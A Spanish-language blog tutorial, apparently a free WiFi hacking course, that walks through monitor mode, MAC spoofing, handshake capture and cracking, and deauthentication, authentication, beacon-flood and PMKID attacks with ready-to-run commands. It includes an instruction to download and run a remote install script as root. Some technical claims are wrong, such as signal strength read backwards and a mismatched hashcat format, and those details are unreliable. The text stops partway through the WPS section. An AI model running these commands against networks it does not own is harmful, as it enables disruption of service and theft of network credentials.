---
layout: post
title: Curso Gratis de Hacking Wifi
---

Hola a todos soy **D3Ext** y espero que esteis bien, en el dia de hoy os traigo un curso totalmente gratuito de *hacking wifi* hecho por mi mismo. El propósito de este curso es que al finalizarlo puedas auditar todo tipo de redes wifi, no hace falta ninguna experiencia en el tema y se enseñara desde 0. Si tenéis alguna duda podéis contactarme por Discord, mi usuario es: **D3Ext#5965**. Si al acabar el curso no has entendido alguna cosa o se te han olvidado algunas cosas, te recomiendo volver a leerlo todo

**¡ He de decir que no me hago cargo de cualquier mal uso que se le pueda dar a todos estos conocimientos !**

## Índice

1. [Requisitos](#requisitos)

      1.1. [¿Cómo elegir una buena antena?](#cómo-elegir-una-buena-antena)

2. [Introducción](#introducción)
3. [Configuración](#configuración)

    3.1. [Activar modo monitor](#activar-modo-monitor)

    3.2. [Desactivar modo monitor](#desactivar-modo-monitor)

    3.3. [Conceptos necesarios](#conceptos-necesarios)

4. [Cambiar direccion MAC](#cambiar-direccion-mac)
5. [Teoria Wifi](#teoria-wifi)
6. [Protocolos Wifi](#protocolos-wifi)

    6.1. [WEP](#wep)

    6.2. [WPA](#wpa)

    6.3. [WPA2](#wpa2)

    6.4. [WPA3](#wpa3)

7. [Capturar información Wifi](#capturar-información-wifi)

    7.1. [Método alternativo](#método-alternativo)

8. [Crackear Handshakes](#crackear-handshakes)
9. [Ataque de Deauthenticacion](#ataque-de-deauthenticacion)
10. [Ataque de Authenticacion](#ataque-de-authenticacion)
11. [Ataque Beacon Flood](#ataque-beacon-flood)
12. [Ataque PMKID](#ataque-pmkid)
13. [Ataque Pixie Dust](#ataque-pixie-dust)
14. [Ataque Null Pin](#ataque-null-pin)
15. [Ataque Michael Shutdown Exploitation](#ataque-michael-shutdown-exploitation)
16. [Ataque Evil Twin](#ataque-evil-twin)
17. [Uso de la herramienta WEF](#uso-de-la-herramienta-wef)
18. [Cómo detectar un ataque de deauthenticacion](#cómo-detectar-un-ataque-de-deauthenticacion)
19. [Descubrir redes ocultas](#descubrir-redes-ocultas)
20. [Extra](#extra)

    20.1. [Wardriving](#wardriving)

    20.2. [Crear gráficos de escaneos wifi](#crear-gráficos-de-escaneos-wifi)

    20.3. [Crear Rainbow Tables](#crear-rainbow-tables)

    20.4. [Hardware](#hardware)

    20.5. [Herramientas automatizadas](#herramientas-automatizadas)

    20.6. [Otros ataques secundarios](#otros-ataques-secundarios)

    20.7. [Errores comunes](#errores-comunes)

21. [Cheat sheet de comandos](#cheat-sheet-de-comandos)
22. [Conclusión](#conclusión)

---------------------------------------------
## Requisitos

Para poder llevar a cabo las tareas y diferentes ataques del curso es necesario contar con una antena de red que soporte el modo **monitor**. Ahora te estarás preguntando: **"¿Por qué hace falta una antena?"** y la respuesta es que para *inyectar* los paquetes wifi en el aire a nuestro antojo no nos sirve cualquier antena de red que ya venga por defecto en un PC o un portátil común.

También hace falta tener un sistema operativo desde donde poder realizar los ataques, aunque esto no lo voy a cubrir en el curso ya que hay muchos tutoriales en internet para poder instalar **Kali Linux**, **Parrot OS** entre otros sistemas como **Wifislax**, una distribucion orientada 100% al hacking wifi. Aunque te recomiendo **Parrot** ya que en **Kali Linux** suele hacer falta instalar **drivers** para poder usar la antena pero al contrario, en **Parrot** no suelen hacer falta. Cuando enchufé mi antena la primera vez ya funcionaba directamente, no tuve que hacer nada.

### ¿Cómo elegir una buena antena?

En mi caso mi antena es el modelo **Alfa AWUS036ACM** y puedo decir que merece la pena por su precio (46€ en tienda europea) y funciona muy bien tanto para 2.4Ghz como para 5Ghz.

Para elegir la antena que más se adapte a tus necesidades vas a tener que tener diferentes cosas en cuenta:
- **Chipset** (lo lleva la antena y hace que pueda soportar modo monitor, por eso es lo más importante)
- **Marca de antena** (la más famosa y la mejor es [Alfa](https://alfa-network.eu), aunque también existen otras como [Panda](https://www.pandawireless.com/) o [TP-Link](https://www.tp-link.com/))
- **Potencia** (algunas modernas soportan 2,4Ghz y 5Ghz pero las antiguas solo 2,4Ghz. Además del alcance de la onda)
- **Precio** (la mas barata por menos de 20€ y la más cara más de 60€, en tiendas oficiales)

Igualmente os dejo una lista de las que yo recomiendo:
- *Alfa AWUS036ACM*
- *Alfa AWUS1900*
- *Alfa AWUS036AC*
- *Alfa AWUS036ACH v.2*

## Introducción

Si ya tienes la antena lista enciende tu **Kali** o **Parrot** y preparate porque hoy vas a aprender a realizar todo tipo de ataques y diferentes técnicas para auditar todas las reds wifi. También tengo que decir que se pueden hacer los ataques de forma automatizada sin tener absolutamente nada de conocimientos pero no sirve de nada porque no sabes ni aprendes nada de lo que estás haciendo, por eso solo recomiendo las herramientas automáticas una vez que ya controles el tema y sepas que hace cada ataque para evitar posibles daños. Aunque primero voy a explicar cómo se configura la antena para poder usarse y los diferentes comandos y funciones que hay para entender todo mejor.

Al principio puede parecer que todo es muy complejo y que son muchos comandos pero no te preocupes porque al final del curso te he dejado una **"Cheat Sheet"** para que puedas revisar que hace cada herramienta y sus usos comunes. También tengo que decir que si en algún momento no me he explicado bien (espero que no sea así), puedes buscar rápidamente en internet.

Algo que quizás os sorprenda es que desde fuera de una wifi se puede ver conexiones y demás información de la red, como por ejemplo cuántos clientes hay conectados en ese momento. Por eso todos los procedimientos que hoy veremos se realizan de la forma que explicaré para conseguir auditar redes.

## Configuración

**¡Antes de empezar! Para realizar estas tareas y ataques que veremos durante todo el curso hacen falta herramientas como por ejemplo *aircrack-ng* entre muchas otras, he preparado un script que te descarga todos los requerimientos en caso de que no los tengas instalado por lo que no te preocupes, simplemente ejecuta estos dos comandos:**

> Ejecuta los comandos como root
```sh
wget https://raw.githubusercontent.com/D3Ext/d3ext.github.io/gh-pages/wifi-install.sh
bash wifi-install.sh
```

Y se deberia de instalar todo de forma automatica

> Imagen del instalador
<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/gh-pages/images/wifi/wifi-course-installer.png">

Una vez hecho esto ya no deberias tener ningun problema en cuanto a las herramientas a lo largo del curso

Vamos a ver si la antena es reconocida y la interfaz se crea en el sistema correctamente, para eso puedes ejecutar:

```sh
ifconfig
```

Si todo funciona bien debería aparecer algo como esto:

<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/gh-pages/images/wifi/wifi-course1.png">

El nombre de tu interfaz puede ser diferente (wlan1,wlan2...), como vemos está todo bien.

Si ejecutamos:

```sh
iwconfig
```

Vemos las diferentes interfaces virtuales:

<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/gh-pages/images/wifi/wifi-course2.png">

Podemos ver las interfaces virtuales, en este caso **wlan0**. Aparece el modo de la interfaz (puede ser Managed, Monitor, Promisc...), el punto de acceso al que está asociada la interfaz (en este caso no está vinculado a ninguna) y demás info sobre la antena.

### Activar modo monitor

Para empezar a usar la antena para auditar redes debes iniciarla en el modo monitor como ya dije antes, este proceso se puede hacer de dos formas, la mas recomendada es con **airmon-ng** y la otra con **iwconfig**, que a pesar de que no tiene soporte sigue funcionando. También os aconsejo que si teneis algun error durante el curso al ejecutar algun comando vayáis a la sección de [Errores Comunes](#errores-comunes) donde dejaré algunos problemas resueltos en cuanto a wifi respecta.

Para iniciarla correctamente ejecutamos:

```sh
airmon-ng start wlan0
```

En tu caso cambia el nombre de **wlan0** si es necesario

Y si ahora volvemos a listar las interfaces virtuales vemos que el nombre cambia añadiendo **"mon"** y el modo también ha cambiado, por lo que ya estaríamos listos.

<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/gh-pages/images/wifi/wifi-course3.png">

La segunda manera de hacer esto seria con **iwconfig** de la siguiente forma:

```sh
ifconfig wlan0 down
iwconfig wlan0 mode monitor
ifconfig wlan0 up
```

Con esta forma el nombre de la interfaz no añade el **mon** al final pero no deberia de haber problema, asique solo tendrias que cambiar el nombre de la interfaz al tuyo en los diferentes comandos

### Desactivar modo monitor

Para devolver la interfaz al modo managed (normal) es muy sencillo solo hay que ejecutar un comando (version actual):

```sh
airmon-ng stop wlan0mon
ifconfig wlan0 up
```

El comando de `airmon-ng` se encarga de quitar el modo monitor y el comando de `ifconfig` se encarga de poner activa la interfaz una vez reconfigurada.

<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/gh-pages/images/wifi/wifi-course4.png">

Y al listar las interfaces virtuales vemos que todo está como al principio

<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/gh-pages/images/wifi/wifi-course2.png">

Para hacer esta tarea de la otra forma, (con iwconfig) ejecuta lo siguiente:

```sh
ifconfig wlan0 down
iwconfig wlan0 mode managed
ifconfig wlan0 up
```

Y tu interfaz deberia volver a ponerse en modo **managed** sin problemas

### Conceptos necesarios

- Debéis saber que durante los ataques se pierde la conexion wifi (se pueden hacer con wifi pero mejor que no), ya que en el sistema existen dos servicios que se encargan de mantener la conexión wifi, estos servicios son **wpa_supplicant** y **NetworkManager**. Pero al tratar de inyectar los paquetes en el aire para realizar cualquier ataque, algunos de esos paquetes se pierden y no llegan al destino, por eso se recomienda *"matar"* esos dos procesos, y para ello **airmon-ng** tiene una opción. En resumen, se pueden hacer los ataques matando los procesos o no, pero es recomendable hacerlo (lo malo es que te quedas sin internet)

> Para matar los procesos conflictivos
```sh
airmon-ng check kill
```

Eso debería servir para hacerlo.

<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/gh-pages/images/wifi/wifi-course5.png">

Cuando dejes de atacar y quieras volver a tener wifi debes ejecutar estos dos comandos para restablecer los dos servicios:

> Para reiniciar los servicios de la conexión
```sh
systemctl restart NetworkManager
systemctl restart wpa_supplicant
```

- Otra cosa muy importante en la que se basa el hacking wifi es en los **handshakes**. 

**¿Qué es un handshake?**, pues para entenderlo de forma fácil es una contraseña encriptada que se transmite en paquetes wifi cuando un cliente se conecta a un punto de acceso (por ejemplo al conectarte con el móvil a tu red wifi personal) Y lo que hacen muchos ataques es intentar expulsar a un dispositivo de la red wifi para que al conectarse automáticamente, el atacante pueda obtener el **handshake** para poder crackearlo después con herramientas como **hashcat** y así poder tener la contraseña de la red wifi.

> Metodología de hacking wifi
<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/gh-pages/images/wifi/wifi-hacking-process.png">

Hasta aquí la parte de configuración y conceptos básicos, si tenéis alguna duda podeis contactarme por Discord: **D3Ext#5965**. Tambien podeis ver mas comandos y contenido [aqui](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-wifi#wifi-basic-commands) y [aqui](https://linuxhint.com/monitor_mode_kali_linux/)

## Cambiar direccion MAC

Seguramente ahora mismo tendrás alguna duda como estas: **"¿Que es la dirección MAC?"**, **"¿Para qué sirve?"**, **"¿Por qué cambiarla?"**, **"¿Que tiene que ver con hacking wifi?"**

Bueno, pues la verdad que son preguntas sencillas.
La dirección MAC es un identificador único que tiene cada dispositivo físico como puede serlo tu móvil o tu televisión, y como ya he dicho permite identificar dispositivos por lo que al auditar redes wifi pueden llegar a ver tu dirección MAC (identificador que envía los paquetes) y por eso es buena práctica cambiarla con la herramienta `macchanger` (instalada por defecto en Kali y Parrot)

<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/gh-pages/images/wifi/mac.jpg">

Para cambiarla por una dirección totalmente aleatoria, podemos ejecutar estos comandos una vez que la interfaz está en modo monitor:

> Apaga la interfaz, cambia la MAC de forma aleatoria y la enciende de nuevo
```sh
ifconfig wlan0mon down
macchanger -r wlan0mon
ifconfig wlan0mon up
```

Y como podemos ver aparece la MAC antigua y la nueva

<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/gh-pages/images/wifi/wifi-course6.png">

Si quereis consultar más recursos acerca de cambiar la MAC podéis aprender [aqui](https://itsfoss.com/change-mac-address-linux/) y [aqui](https://www.makeuseof.com/how-to-change-mac-address-on-linux/)

## Teoria Wifi

Para entender mejor todos los ataques, tambien debemos conocer como funciona la tecnologia **Wi-Fi** a nivel *"cientifico"*

El estándar **802.11** es una familia de normas inalámbricas creada por el **Institute of Electrical and Electronics Engineers (IEEE)**. **802.11n** es la forma más apropiada de llamar a la tecnología **Wi-Fi**, lanzada en **2009**. Mejoró con respecto a versiones anteriores de Wi-Fi con múltiples radios, técnicas avanzadas de transmisión y recepción, y la opción de usar el espectro de 5 GHz. Todo implica una velocidad de datos de hasta **600 Mbps**

La familia **802.11** consta de una serie de técnicas de *modulación semidúplex* (half duplex) por medio del aire que utilizan el mismo protocolo básico. Al estándar **802.11-1997** le siguió el **802.11b**, que fue el primero aceptado ampliamente. Posteriormente surgirían versiones mejoradas: 802.11a, 802.11g, 802.11n y 802.11ac.

Por otro lado la versión **802.11a** utiliza la banda **U-NII** de 5 GHz que, para gran parte del mundo, ofrece al menos **23 canales** que no se superponen en lugar de la banda de frecuencia ISM de 2,4 GHz que ofrece solo tres canales que no se superponen (El canal **1**, **6** y **11**). **802.11n** puede utilizar la banda de 2,4 GHz o la de 5 GHz mientras que **802.11ac** utiliza solo la banda de 5 GHz. El segmento del espectro de radiofrecuencia utilizado por la **802.11** varía de un país a otro. Las frecuencias utilizadas por los canales uno a seis de **802.11b** y **802.11g** caen dentro de la banda de radioaficionados de 2,4 GHz.

- Tambien te preguntaras como es que los dispositivos detectan las wifis cercanas, deja que te explique.

Como ya sabras cuando te conectas a una red y luego vuelves al mismo sitio, tu dispositivo se conecta automaticamente, eso ocurre porque los dispositivos recuerdan los puntos de acceso a los que han estado conectados y tu dispositivo siempre esta emitiendo unos paquetes llamados **"Probe requests"** los cuales estan buscando esos puntos de acceso a los que estuvistes conectado. Si al enviar esos **"Probe requests"** tu dispositivo recibe la **"Probe response"** significa que el AP ha recibido el paquete y eso indica que el AP esta cerca y activo, por lo que el dispositivo se asociaria de forma automatica en caso de haber estado conectado anteriormente

## Protocolos Wifi

Bueno, este punto es bastante importante para entender los ataques en cada situación ante diferentes protocolos. Por eso va a ser más teórico explicando cómo funcionan los protocolos. No tengo esperanza de que mucha gente lea esta parte pero es muy interesante aun así

<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/gh-pages/images/wifi/protocols.png">

### WEP
Este protocolo cifra el tráfico con una clave hexadecimal de **64 o 128 bits**. Esta es una clave estática, lo que significa que todo el tráfico se cifra con una única clave, sin importar el dispositivo. Una clave WEP permite que las computadoras en una red intercambien mensajes codificados mientras ocultan a los intrusos el contenido de los mensajes. Esta clave es la que se utiliza para conectarse a una red con seguridad inalámbrica habilitada. Los ataques más útiles contra este protocolo obsoleto son: **Caffe-Latte y Replay**

### WPA
Este protocolo fue el reemplazo de **Wi-Fi Alliance** para **WEP**, el cual fue integrado en **2003**. Compartía similitudes con **WEP**, pero ofrecía mejoras en la forma en que manejaba las claves de seguridad y cómo se autoriza a los usuarios. Mientras que **WEP** proporciona la misma clave a cada sistema autorizado, **WPA** usa el protocolo de integridad de clave temporal (**TKIP**, por sus siglas en inglés), el cual cambia dinámicamente la clave que usan los sistemas. Esto evita que los intrusos creen su propia clave de cifrado para que coincida con la utilizada por la red protegida

### WPA2
Se introdujo en el **2004** y era una versión mejorada de **WPA**. **WPA2** se basa en el mecanismo de red de seguridad robusta (RSN, por sus siglas en inglés) y funciona en dos modos: **Modo personal o clave precompartida (WPA2-PSK)**: se basa en un código de acceso compartido y generalmente se usa en entornos domésticos. **Modo empresarial (WPA2-EAP)**: como sugiere el nombre, este modo es más adecuado para uso en empresas u organizaciones. Aun así este protocolo puede ser explotado de muchas formas como con el ataque **KRACK** (del cual hay muy poca información) reinstalando una clave para obligar a la víctima a conectarse a un punto de acceso malicioso.

### WPA3
**WPA3** es la tercera iteración del protocolo de acceso Wi-Fi protegido. Wi-Fi Alliance introdujo **WPA3** en el año **2018**, integró nuevas funciones para uso personal y empresarial, que incluyen: **Cifrado de datos individualizado**, **Protocolo de autenticación simultánea de iguales**, **Protección contra ataques de fuerza bruta más fuerte**

## Capturar información Wifi

En esta punto voy a enseñar a capturar toda la información de las wifis y a escanearlas desde la terminal entre otras cosas

Para listar las wifis debes tener la antena en modo monitor por supuesto, y después haz:

> Escaneo de puntos de acceso con su información
```sh
airodump-ng wlan0mon
```

Al ejecutarlo deberías empezar a ver como la pantalla se llena de wifis con su información respectiva. 

> Simple escaneo de redes
<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/gh-pages/images/wifi/wifi-course7.png">

Si nunca has visto antes este tipo de escaneo quizás no entiendas muchas de las cosas que ves, para aclarar todo lo posible voy a explicar qué significan las cosas más importantes. La info está organizada en columnas, donde **BSSID** es la dirección MAC del punto de acceso, **PWR** es la fuerza de la señal que recibes y cuanto menor sea el número más cerca está el punto de acceso, **CH** es el canal en el que opera ese AP (van desde el 1 al 14 en 2.4Ghz), **ENC** es el tipo de encriptación que tiene el AP (en caso de que ponga **OPN** significa que la red está abierta), **CIPHER** es el tipo de cifrado que usa el AP, **AUTH** es el método de authenticacion al AP y suele ser **PSK** (Pre-Shared Key) es decir, usando contraseña. Y finalmente **ESSID** es el nombre del punto de acceso.

Una vez hemos seleccionado una wifi para tratar de *"escuchar"* en su canal podemos hacerlo de la siguiente forma:

> Cambia el número del canal (-c) al canal de tu wifi 
```sh
airodump-ng wlan0mon -w captura -c <numero-del-canal>
```

> Foto capturando información en el canal especificado
<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/gh-pages/images/wifi/wifi-course8.png">

En este punto mientras tengamos el **airodump-ng** activo, se puede decir que estamos a la espera de los paquetes del punto de acceso para poder obtener el **handshake**.  **¿Como puedo saber si he capturado un handshake?**, pues si durante la captura de **airodump-ng** alguien se conecta a la wifi deberías ver arriba a la derecha algo como **"WPA handshake: "**, asique puedes probarlo tu mismo con tu wifi personal conectandote para ver si recibes el handshake. Una vez lo recibas presiona **Ctrl + C** para terminar la captura y en este punto ya puedes crackearlo (para obtener la contraseña), pero eso lo enseñaré en el siguiente apartado.

Este es el escaneo mas especifico en un punto de acceso concreto, asique ya sabiendo cómo podemos hacer para capturar la información y los handshakes podemos continuar.

Para aprender más acerca de escanear redes te recomiendo este [articulo](https://hackingvision.com/2017/04/25/scanning-wireless-access-point-information-using-airodump-ng-kali-linux/)

### Método alternativo

Para hacer un simple escaneo de wifis mas bonito tambien puedes hacerlo de esta forma:

```sh
wash -a -s -2 -5 -i wlan0mon
```

Esta forma quizás no es la mejor pero la información se puede obtener fácil y de forma más intuitiva

> Escaneo alternativo con wash
<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/gh-pages/images/wifi/wifi-course9.png">

## Crackear handshakes

Bueno, supongamos que ya has obtenido el handshake de una red al conectarse un cliente, pues ahora vas a aprender a crackearlo con `aircrack-ng`

> Comando para crackear handshakes usando aircrack-ng
```sh
aircrack-ng captura-01.cap -e <nombre-del-AP> -w /usr/share/wordlists/rockyou.txt
```

Si el archivo especificado contiene un handshake válido debería empezar a crackearlo probando las contraseñas. Puedes ver en la parte superior las contraseñas que prueba y la velocidad

> Aircrack-ng crackeando el handshake
<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/gh-pages/images/wifi/wifi-course10.png">

En el caso de que el archivo no contenga ningún handshake, **aircrack-ng** no empezará el proceso diciendo que no hay nada para crackear. Si quieres aprender mas sobre aircrack-ng y las herramientas de la suite puedes hacerlo [aqui](https://www.redeszone.net/tutoriales/seguridad/aircrack-ng-hackear-redes-wifi/) y [aqui](https://www.aircrack-ng.org/)

- Como podéis ver el archivo no tiene ningún handshake

> Aircrack-ng avisa de que no hay handshake
<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/gh-pages/images/wifi/wifi-course11.png">

También se puede hacer este proceso con la herramienta **hashcat** pero no lo recomiendo si vas a hacer todo desde máquina virtual y no tienes mucha potencia. Por eso recomiendo **aircrack-ng** ya que usa la CPU para crackear los handshakes, además hay que hacer un paso extra para formatear el handshake y que **hashcat** lo acepte.

> Formateo del handshake
```sh
cap2hccapx captura-01.cap final_handshake
```

> Crackeo del handshake con hashcat
```sh
hashcat -m 22000 final_handshake /usr/share/wordlists/rockyou.txt
```

En cuanto a la sintaxis de hashcat, **"-m"** sirve para especificar el tipo de hash que vas a crackear, en este caso **22000** es el adecuado para los hashes WPA también llamados handshakes, después del modo le pasas el archivo del handshake y luego con el parámetro **”-w”** le pasas el diccionario que contiene las contraseñas

> hashcat crackeando los handshakes
<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/gh-pages/images/wifi/wifi-course12.png">

También tenéis otra alternativa para crackear los handshakes la cual los crackea miles de veces más rápido… aunque no es gratis claro, siempre podéis recurrir a servicios online como **[Linode](https://www.linode.com/)** el cual usa muchísima potencia de **GPU** de otros dispositivos ofrecidos por ellos mismos para crackear los handshakes por ti a una velocidad muy rápida.

Si quieres aprender mas acerca de aircrack-ng y hashcat podeis hacerlo [aqui](https://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force), [aqui](https://www.sysadminsdecuba.com/2020/06/como-crackear-wpa2-en-redes-inalambricas-usando-airgedon-y-hashcat/amp/) y [aqui](https://geekflare.com/es/password-cracking-with-hashcat/)

## Ataque de Deauthenticacion

Bueno espero que hayáis entendido todo lo anterior porque ahora voy a enseñar como hacer todos los ataques (la mayoría) para poder auditar todas las redes en cualquier situación y de diferentes formas.

**¿Que es el ataque de deauthenticacion?**, pues es un simple ataque en el que emites unos paquetes wifi especiales para "comunicarte" con el router y hacerle creer que los dispositivos se están desconectando de la red, por lo que al emitir esos paquetes el router los expulsa del punto de acceso haciendo que el cliente o los clientes se reconecten automáticamente tras unos segundos a la red y así generando un handshake el cual podemos interceptar. Por aquí te dejo una imagen para que lo entiendas mejor

<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/gh-pages/images/wifi/deauthentication-attack.png">

**¿Y cómo se ejecuta el ataque?** pues es muy simple, usando aireplay-ng de esta forma:

```sh
aireplay-ng -0 10 -e <essid> -c FF:FF:FF:FF:FF:FF wlan0mon
```

También te preguntarás: **¿Qué hace exactamente ese comando?** pues aqui te explico:

**"-0"** indica el tipo de ataque a realizar y el **"10"** para indicar la cantidad total de paquetes de deauthenticacion a emitir, **"-e"**  sirve para especificar el nombre de una red y **"nombre-de-la-wifi"** pues es el propio nombre, **"-c"** se encarga de especificar la dirección MAC del dispositivo al que vas a atacar y **"FF:FF:FF:FF:FF:FF"** es la dirección MAC, finalmente **"wlan0mon"** es el nombre de la interfaz en modo monitor.

**¡Importante!**, la direccion MAC **FF:FF:FF:FF:FF:FF** es especial y se le llama direccion **Broadcast**, la cual hace referencia a todos los clientes de esa red. Por lo que si en vez de poner la direccion concreta de un cliente pones **FF:FF:FF:FF:FF:FF** como yo hice el ataque deberia expulsar a todos los clientes a la vez. Obviamente solo sirve en ataques como este porque atacan directamente una direccion **MAC**. Tambien si en vez de poner una cantidad exacta de paquetes quieres hacer el ataque durante mucho tiempo o de forma indefinida puedes poner **0** paquetes y **aireplay-ng** atacara de forma infinita al AP quedandolo inutilizado

> Foto del ataque
<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/gh-pages/images/wifi/wifi-course13.png">

Si lo pruebas en tu propia red puedes ver desde cualquier otro dispositivo (móvil, laptop...) que te has desconectado de la red y que pocos segundos después te reconectas de forma automática.

Tambien hay otra forma de hacer este ataque con otro tipo de paquetes llamados paquetes de **dissasociation**, aunque la informacion del paquete cambia, la finalidad es la misma (ocasionar un DoS). Y se pueden emitir con **mdk4** asi:

```sh
mdk4 wlan0mon d -E "nombre-de-la-wifi" -c <canal>
```

Si todo ha ido bien deberias ver el mismo resultado

Por [aqui](https://fwhibbit.es/aircrack-ng-ii-desautenticacion-y-autenticacion-falsa) te dejo un post donde puedes ver mas informacion

## Ataque de Authenticacion

En este ataque como os podéis imaginar por el nombre, se trata de realizar el proceso contrario a la deauthenticacion. En este caso también puedes ocasionar un **DoS** (Denial of Service) para expulsar a los clientes al inyectar **muchos clientes falsos** al AP para que el router piense que se han conectado muchos dispositivos y de esta forma se satura. También he de decir que este ataque funciona a veces y rara vez expulsa a los clientes. Por aquí tienes una imagen que explica bien el ataque

<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/gh-pages/images/wifi/authentication-attack.png">

Para este ataque usaremos **mdk4** de la siguiente forma:

```sh
mdk4 wlan0mon a -i <bssid> -m
```

El parámetro **”a”** sirve para especificar el tipo de ataque (authenticacion), **”-i \<bssid\>”** se refiere a la dirección física del router a la que se le inyectaran los paquetes y **“-m”** para usar clientes reales. En el caso de que el ataque demore mucho al inicio esperando un **beacon frame** prueba a cambiar el parámetro **-i** por **-a**

<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/gh-pages/images/wifi/wifi-course14.png">

Si quieres conocer más y saber acerca de **mdk4** puedes hacerlo [aquí](https://github.com/aircrack-ng/mdk4) y [aquí](https://en.kali.tools/?p=864)

## Ataque Beacon Flood

Este ataque es muy curioso, para expulsar a los clientes lo que se hace es crear muchísimos puntos de acceso para intentar saturar el espectro de onda en el canal de la red a auditar, es decir creas muchas wifis para saturar la onda del canal de la wifi víctima. En ocasiones este ataque puede llegar a romper escáneres de red e incluso drivers si el ataque se prolonga durante un largo tiempo. Actualmente no es el ataque más funcional pero es interesante conocerlo y poder crear puntos de acceso de forma masiva para probarlo y ver los resultados de cara a una auditoría real

<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/gh-pages/images/wifi/beacon-flood.png">

En esta ocasión el ataque también se hace con **mdk4**

```sh
mdk4 wlan0mon b -c <número-del-canal> -s 2000
```

Si la información que has usado es correcta y todo va bien deberías ver algo como esto:

<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/gh-pages/images/wifi/wifi-course15.png">

Y si ahora mientras que el ataque se está ejecutando tratamos de escanear los puntos de acceso podemos ver los puntos falsos que estamos creando...

> Escaneo simple con **wash**
<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/gh-pages/images/wifi/wifi-course16.png">

Como puedes ver los nombres de los APs se crean de forma aleatoria pero si quieres crearlos con **nombres personalizados** tambien lo puedes hacer de esta forma:

```sh
mdk4 wlan0mon b -c <número-del-canal> -s 2000 -f nombres.txt
```

En este caso añadimos el parámetro **”-f”** para hacer referencia a que queremos usar ese archivo, el contenido de dicho archivo debe ser un nombre por cada línea, ejemplo:

```sh
wifi-1
wifi-2
wifi-3
wifi-4
......
```

El ataque no cambia realmente, solo que los APs se generan con los nombres elegidos.

## Ataque PMKID

Hasta la fecha de hoy (18/09/2022) este es el ataque funcional al 100% más moderno, además funciona de forma totalmente diferente hasta los anteriormente vistos y tiene tres grandes ventajas.

**1.** Los otros ataques tratan de desconectar a los clientes de forma activa pero este ataque es completamente pasivo y no hace falta interactuar con el punto de acceso (no hay que enviar paquetes) ya que el ataque se basa en obtener los handshakes PMKID que tramita el AP continuamente..

**2.** Otra gran ventaja es que los handshakes son mucho más pequeños que los handshakes comunes, **¿Y por qué es una ventaja?**, pues porque si son más pequeños, el proceso para crackearlos es mucho más rápido ya que la herramienta (hashcat) tiene que transformar la contraseña que prueba en el formato del handshake y al ser más pequeños y legibles el proceso tarda mucho menos.

**3.** Este ataque se puede realizar sin que haya ningún cliente conectado al AP por lo que sí tenemos que auditar una red pero no encontramos ningún cliente conectado podríamos servirnos de este ataque para conseguir nuestro objetivo.

El único inconveniente de este ataque es que si estás a mucha distancia del AP puede que tardes mucho tiempo en conseguir el handshake o que directamente no puedas capturarlo. Aun así en caso de estar a distancia media o corta de un AP tardas poco tiempo en obtener el handshake y es muy buena forma para auditar una red teniendo en cuenta que en ningún momento interactúas con el AP.

Para empezar a *“escuchar”* en el aire en busca de handshakes PMKID solo hay que ejecutar el siguiente comando:

```sh
hcxdumptool -i wlan0mon -o captura –-enable_status=1
```

Deberias ver algo como esto:

> Output de **hcxdumptool**
<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/gh-pages/images/wifi/wifi-course17.png">

En este momento estamos capturando diferentes tipos paquetes que se tramitan, en especial los **PMKIDROGUE** si hay APs cerca deberías empezar a ver como empiezan a *”llover”* hashes por la pantalla que podremos crackear como un handshake normal

Cuando quieras dejar de interceptar los hashes presiona Ctrl + C y en este punto para poder crackear los handshakes obtenidos tenemos que hacer un pequeño tratamiento para sacar todos esos hashes de la captura, y para esto usaremos **hcxpcapngtool** (también parte de **hcxtools**)

> Sacar todos los hashes de la captura
```sh
hcxpcapngtool -o hashes captura
```

<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/gh-pages/images/wifi/wifi-course18.png">

Ahora si, ya podríamos empezar a crackear los hashes con **hashcat**, para eso ejecutamos lo siguiente:

```sh
hashcat -m 22000 hashes /usr/share/wordlists/rockyou.txt
```

Y empezará a crackear los handshakes como de costumbre

## Ataque Pixie Dust

En este caso entramos a otra parte ligeramente distinta de hacking wifi, el famoso **WPS** que funciona con PINs además de contraseñas.

**¿Qué es WPS?**, pues las siglas **WPS** significan **Wifi Protected Setup**, lo que en español vendría a significar configuración protegida de WiFi. Con esto, ya te puedes imaginar que se trata de un sistema para configurar la conexión WiFi de un dispositivo de forma fácil y segura.  Su propósito es el de facilitar un método para que otros dispositivos puedan *"emparejarse"* a la WiFi de tu casa. Con esto me refiero a que no vas a necesitar contraseña ni nombre de WiFi para conectarte, sino conectarte al router con este botón, y de ahí obtener acceso a la red. Además de el método del botón físico, el método más extendido es mediante PINs, en el cual si enviabas el PIN correcto al router, te devuelve la información para conectarte a la red.

<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/gh-pages/images/wifi/pixie-dust.png">

Para detectar los puntos de acceso con **WPS** activado podemos hacerlo con **wash**, y las herramientas usadas para la explotación son **reaver**, **pixiewps** y **bully** entre otras.

> Uso de **wash** para detectar APs
```sh
wash -2 -5 -a -s -i wlan0mon
```

En mi caso veo estas redes:

